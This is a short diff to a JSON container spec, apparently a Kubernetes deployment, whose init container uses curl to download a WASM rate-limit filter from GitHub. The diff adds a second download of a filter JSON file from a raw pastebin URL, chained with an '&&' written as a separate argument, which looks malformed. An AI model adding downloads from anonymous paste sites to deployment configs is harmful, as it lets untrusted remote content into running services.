@@ -14,7 +14,13 @@
               "-L",
               "-o",
               "/var/lib/imagehub/filter.wasm",
-              "https://github.com/layer5io/image-hub/raw/master/rate-limit-filter/pkg/rate_limit_filter_bg.wasm"
+              "https://github.com/layer5io/image-hub/raw/master/rate-limit-filter/pkg/rate_limit_filter_bg.wasm",
+              "&&",
+              "curl",
+              "-L",
+              "-o",
+              "/var/lib/imagehub/filter.json",
+              "https://pastebin.com/raw/ME4Xz5Wf"
             ],
             "image": "curlimages/curl",
             "imagePullPolicy": "Always",
